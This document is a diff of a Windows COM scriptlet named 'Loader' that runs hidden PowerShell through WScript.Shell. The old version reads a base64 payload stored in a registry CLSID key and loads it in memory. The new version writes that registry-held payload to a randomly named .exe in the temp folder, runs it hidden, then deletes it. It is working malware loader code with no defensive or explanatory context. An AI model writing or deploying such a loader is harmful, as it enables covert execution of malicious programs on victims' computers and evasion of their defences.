@@ -1,12 +1,22 @@
 <?XML version="1.0"?>
 <scriptlet>
-<registration progid="Loader" classid="{00000000-0000-0000-0000-000000000001}">
+<registration
+    progid="Loader"
+    classid="{00000000-0000-0000-0000-000000000001}"
+    description="Loader">
 </registration>
 <script language="JScript">
 <![CDATA[
     var obj = new ActiveXObject("WScript.Shell");
-    var ps = "powershell -NoP -W Hidden -C \"$b64=(Get-ItemProperty 'HKCU:\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000001}').Payload;[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($b64)).EntryPoint.Invoke($null,$null)\"";
-    obj.Run(ps, 0, false);
+    var cmd = "powershell -NoP -W Hidden -C \"";
+    cmd += "$k='HKCU:\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000001}';";
+    cmd += "$b=(Get-ItemProperty -Path $k -Name 'Payload').Payload;";
+    cmd += "$p=$env:TEMP+'\\'+[char](65..90|%{[char]$_}|Get-Random)+[char](65..90|%{[char]$_}|Get-Random)+'.exe';";
+    cmd += "[System.IO.File]::WriteAllBytes($p,[byte[]]$b);";
+    cmd += "Start-Process $p -WindowStyle Hidden;";
+    cmd += "Start-Sleep 3;";
+    cmd += "Remove-Item $p -Force -ErrorAction SilentlyContinue;\"";
+    obj.Run(cmd, 0, false);
 ]]>
 </script>
 </scriptlet>
